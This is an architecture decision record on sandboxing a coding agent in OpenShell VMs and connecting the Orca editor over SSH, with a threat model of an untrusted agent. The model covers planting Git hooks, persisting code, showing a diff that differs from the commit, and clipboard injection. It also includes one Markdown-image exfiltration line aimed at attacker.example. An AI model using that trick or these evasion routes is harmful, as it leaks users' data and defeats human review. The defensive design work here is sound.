# ADR 0001: Work through Git in the sandbox, and connect Orca over SSH

- **Status:** Accepted for Orca; VS Code is deferred (see Consequences). Code comes in and goes out through the repo on GitHub ([ADR 0004](0004-git-host.md)).

## Context

The goal is to use an editor such as [Orca](https://github.com/stablyai/orca) or VS Code with Pi running in OpenShell sandboxes, as a building block for several agents that each run in their own sandbox. Orca is a desktop app that runs coding agents, one per Git worktree, and adds diff review, commits and PRs, and orchestration through its `orca` CLI. Agents can run on the local machine, on an SSH host, on a remote Orca server or on a cloud VM. Pi is listed as a supported agent. VS Code Remote-SSH offers the same for a single agent.

Real work needs Git in the VM (`git status`, diffs, branches) and package installs, so that tests can run there.

Docker's guide [Connect Orca to a sandbox](https://github.com/docker/docs/blob/main/content/manuals/ai/sandboxes/integrations/orca.md) describes the same pairing for Docker Sandboxes. Orca has no sandbox-specific integration: it treats the sandbox as an ordinary SSH host, installs its own server there on the first connection, and runs agents, terminals and Git inside it, while its editor and diff views stay on the Mac. It offers only the agents it finds installed on the host, so the image must contain Pi. Each sandbox runs its own Orca server, so the `orca` CLI in one sandbox sees only that sandbox's worktrees.

## Options

| | Option | Assessment |
|---|---|---|
| A | An editor on the Mac runs `pi-sandbox run` in its terminal. | The editor's diffs, commits and orchestration see only the Mac's files, never the VM's changes, so it is just a terminal. |
| B | **The editor uses the sandbox as an SSH host** (`openshell sandbox ssh-config`). | Worktrees, diffs and agents all live in the VM. SSH goes through the gateway, and the sandbox opens no network port. Costs: the editor's server in the VM, a long-lived sandbox, a Git repo in the VM, and the editor as a new trust boundary (see Consequences). |
| C | Mount the editor's worktree on the Mac into the VM. | Rejected, see [Why not mount](#why-not-mount). |

## Decision

Adopt **B**: Git and package installs in the VM, and Orca on the sandbox as an SSH host. VS Code Remote-SSH is deferred (see Consequences). `pi-sandbox` keeps one mode for every client, so the same flow works from a terminal, Orca, or plain Git.

**`pi-sandbox ssh-config`** prints a block with the settings that turn off forwarding and login-shell startup files, followed by OpenShell's entry for the sandbox.
- The settings come first and in their own block: ssh uses the first value it finds, so they hold whatever OpenShell's entry sets.
- It is its own command and not part of `run`: the output goes into a file, and only editor users need it.
- Not `openshell sandbox connect --editor`: it writes OpenShell's entry, without these settings, into a file that OpenShell manages.

### Why not mount

OpenShell can bind-mount host folders into the VM, but this setup doesn't:
- Mounts need three gateway-wide settings that weaken every sandbox on that gateway.
- Every mount adds a virtio-fs device. OpenShell's docs warn that libkrun "does not confine a compromised guest kernel to the configured source directory".
- A writable mount lets the agent plant Git hooks, `.git/config` entries or build scripts that later run on the Mac. Mounts can't be nested, so `.git` can't be made read-only inside a writable mount.

A clone keeps a review step between the agent and the Mac: the pull request on GitHub, which is required only in a repo with the ruleset of ADR 0004.

### Isolation unit

A sandbox can hold several worktrees and agents. These agents can read and change each other's worktrees, Git hooks and Pi's config folder, and share the VM's CPU, memory and disk, so they must trust each other. Agents that don't trust each other get a sandbox each: several sandboxes can work on one repo, and they meet only on GitHub (ADR 0004). Orca orchestrates only within one sandbox, so coordinating agents across sandboxes needs a coordinator outside them; a later ADR covers it.

## User flow

The flow is ADR 0004's (decisions 5 and 6, and its diagram): `pi-sandbox run` clones the repo, Pi pushes its work as a branch, and the review and the merge happen in the branch's pull request. Work in the VM is done from `pi-sandbox shell`, or in Orca on the SSH host that `pi-sandbox ssh-config` prints, in worktrees if several agents run. Tests and builds run in the VM.

## Consequences

- **The VM's commits come back unchanged,** including the messages and authors written in the VM. They are part of the final review; squash them if needed.
- **The editor's review is a convenience, not the gate:** an editor shows content that the VM controls, through a server running in the VM, so the VM could show one diff and commit another, or add commits after the review. The gate is the pull request's diff, computed by GitHub from the pushed objects, and the merge names the reviewed commit (ADR 0004, decision 6). It is a gate only in a repo with the ruleset of ADR 0004.
- **More ways out:** packages, GitHub, docs and web search, mostly read-only; see [ADR 0003](0003-network-access.md).
- **Repo below `HOME`, not in it:** in the VM, `HOME` is `/sandbox`. Interactive SSH sessions run `~/.bashrc`; commands sent over SSH and `openshell sandbox exec` run `~/.profile` unless told otherwise. If the repo were `HOME`, its dotfiles would configure every shell, and the files editors and other tools write to `HOME` would land in the repo copy. So the repo is in `/sandbox/work`, and Pi's config stays in `/var/lib/pi-agent`.
- **Persistence inside the VM:** an agent can leave code that runs later in other sessions: in the editor's server, `~/.bashrc`, Pi's extensions folder, or `.git/config`. Within one trust domain that is acceptable; one sandbox per agent needs read-only config for Pi.
- **Git identity:** commits in the VM need `user.name` and `user.email`. `pi-sandbox run` copies the Mac repo's values into the VM's clone, so nothing user-specific is in the image or this repo. Like the authors in the repo's history, they are visible to Pi and so to the provider. Pi's commits are marked by a trailer instead: a `prepare-commit-msg` hook in the image (`pi-agent/git-hooks`) adds `Assisted-by: Pi:PROVIDER/MODEL (thinking: LEVEL)` from the variables Pi sets for the commands it runs. It marks, it doesn't enforce:
  - Code in the VM can turn it off, and a repo that sets its own `core.hooksPath` (husky does on `npm install`) replaces it.
  - Commits Pi replays with `git rebase` or `git cherry-pick` get the trailer too.
  - The hook is set in `/etc/gitconfig` with `core.hooksPath`, so hooks a repo installs in `.git/hooks` don't run in the VM.
- **Long-lived sandbox:** OpenShell has rough edges here: restarting a `Completed` sandbox ([#4505](https://github.com/ai-openshell/OpenShell/issues/4505)), gateway restarts ([#4209](https://github.com/ai-openshell/OpenShell/issues/4209)), and a full VM disk ([#5149](https://github.com/ai-openshell/OpenShell/issues/5149)). Disk size is gateway-wide, and dependencies (such as `node_modules` or a virtualenv per worktree) will dominate it in real projects. Commits that exist only in the VM are lost with it, so push regularly.
- **Orca inside the VM:** Orca installs its server, its CLI and its worktrees in `HOME`, and Pi extensions in Pi's config folder (`/var/lib/pi-agent/extensions`). Its terminals need `/dev/ptmx` and `/dev/pts` in `policy.yaml`. It needs no network inside the VM and no compiler in the image: it copies its server and Node.js from the Mac. Its server there tries to look up and install agent CLIs; the sandbox blocks that, because the read-only rules name the programs that may use them, and Orca works without it.
- **New trust boundary:** the editor on the Mac reads and displays content that the VM controls, such as diffs, file previews and Markdown. A malicious repo or agent could target the editor itself, not only the VM. So for sandbox hosts:
  - Orca's setting that lets agents on the host use Orca's browser tabs on the Mac stays off. It is set per host, and on by default for new hosts.
  - Port forwarding stays off, because it would make services in the VM reachable on the Mac. Orca's own `ssh -L` tunnel to its server in the VM is dropped with it; Orca then falls back to the SSH session's standard input and output, after a timeout.
  - Files from sandbox hosts are not opened in a Markdown preview. Orca's preview loads remote images from the Mac's own network, so a file in the VM containing `![](https://attacker.example/?d=<data>)` would send data out past the sandbox's network policy. Orca's chat may load remote images too, and no setting blocks either; the Markdown view can default to source.
  - "Link previews" in Orca's chat, which fetches linked pages, is turned off, and so is publishing public artifact links, which goes through the Orca account on the Mac.
  - Terminal clipboard writes (OSC 52, on by default in Orca) are turned off. Otherwise the VM could put a command on the clipboard that runs when it is pasted into a Mac shell. Updates can reset the setting, so it needs a look after them.
  - The SSH entry turns off agent, X11 and port forwarding.

  For hosts with a `ProxyCommand`, as in OpenShell's entries, Orca uses the Mac's `ssh`, so the SSH entry's settings apply. Orca updates itself, so its version can't be pinned. Orca's telemetry carries no content from the host, according to its docs, and crash dumps stay on the Mac.
- **VS Code Remote-SSH is deferred.** It always reaches its server through an SSH forward, which the SSH entry turns off, and its terminal lets a program in the VM write and read the Mac's clipboard, with no setting to stop it. Using it means allowing forwarding for that host and accepting the clipboard access: a new decision, for a later ADR.

## Open questions

- Whether Orca's link previews and chat images are fetched on the Mac or in the VM.
- Orca's defaults and image loading under "New trust boundary", and VS Code Remote-SSH's forward and clipboard access: both are from the source code and untested.

## Next

1. **Observability:** ADR 0002.
2. **One sandbox per agent**, with a coordinator outside the sandboxes: a later ADR (see "Isolation unit"). It builds on ADR 0004, to hand one agent's branch to another's sandbox for review.
